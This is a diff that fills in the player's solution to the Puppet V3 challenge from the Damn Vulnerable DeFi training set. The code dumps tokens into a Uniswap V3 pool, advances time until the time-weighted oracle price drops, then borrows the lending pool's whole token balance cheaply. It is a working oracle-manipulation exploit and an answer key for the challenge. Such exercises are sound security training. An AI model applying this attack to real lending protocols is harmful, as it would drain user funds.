@@ -4,7 +4,9 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -119,8 +121,52 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        ISwapRouter v3Router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        weth.deposit{value: player.balance}();
+        weth.approve(address(v3Router), type(uint256).max);
+        token.approve(address(v3Router), type(uint256).max);
+        v3Router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        uint256 waitedTime = 0;
+        while (waitedTime < 115){
+            uint256 tokenPerEth = getPrice();
+            if (LENDING_POOL_INITIAL_TOKEN_BALANCE * getPrice()  * 3 < weth.balanceOf(player) * 1 ether){
+                break;
+            }
+            vm.warp(block.timestamp + 12);
+            waitedTime += 12;
+        }
+
+        console.log("Total time to wait:", waitedTime);
+
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
+
+    function getPrice() public view returns (uint256) {
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        (int24 arithmeticMeanTick,) = OracleLibrary.consult({pool: address(uniswapPool), secondsAgo: 10 minutes});
+        return OracleLibrary.getQuoteAtTick({
+            tick: arithmeticMeanTick,
+            baseAmount: 1 ether,
+            baseToken: address(token),
+            quoteToken: address(weth)
+        });
+    }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
